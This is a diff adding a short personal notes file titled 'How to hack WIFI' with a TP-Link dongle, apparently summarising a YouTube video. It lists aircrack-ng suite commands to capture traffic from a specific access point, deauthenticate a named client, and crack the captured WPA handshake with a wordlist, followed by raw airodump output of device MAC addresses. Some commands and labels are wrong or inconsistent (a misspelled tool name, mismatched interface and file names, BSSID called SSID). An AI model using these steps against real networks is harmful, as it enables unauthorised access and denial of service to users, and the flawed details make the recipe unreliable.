@@ -1,0 +1,25 @@
+How to hack WIFI using TP-LINK WIFi Dongle   https://www.youtube.com/watch?v=zAWcu3NQLME
+1. Check if the dongle(wifi card)is successfully connected to your computer
+#iwconfig
+2. Make the wifi interface into monitor mode for packet capture
+#airmon-ng start wlan0
+3. 
+#airodump-ng wlan0
+4. To see whos connected to the wifi D4:CF:F9:1A:91:28 is the ssid of the wifi
+#airodump-ng -c1 -w capture -d D4:CF:F9:1A:91:28 wlan1mon
+5. Kick them for reauthentication D4:CF:F9:1A:91:28 is the ssid of the wifi and 44:D8:78:16:02:A6 is the mac address of host
+#aireply-ng --deauth 0 -a D4:CF:F9:1A:91:28 -c 44:D8:78:16:02:A6
+6. You can check the cap from wireshark, search for eapol in the wireshark filter bar
+#wireshark capture-01.cap
+7. Stop the monitoring mode
+#airmon-ng stop wlan1mon
+8. Time to crack the password using the cap file
+#aircrack-ng capture-04.cap -w /usr/share/dict/words
+
+
+
+10:E9:53:E1:CD:BE  4C:34:88:AB:05:E6  -25    1e-48e    31     5041                            
+ 10:E9:53:E1:CD:BE  8C:85:90:AE:A6:C3  -30    1e-24e     1       86                            
+ 10:E9:53:E1:CD:BE  7C:04:D0:40:12:B8  -30    1e-24     38      148                            
+ 10:E9:53:E1:CD:BE  44:CB:8B:33:3B:EE  -47    0e- 0e     0       23                            
+ 10:E9:53:E1:CD:BE  88:AD:D2:81:6B:2A  	
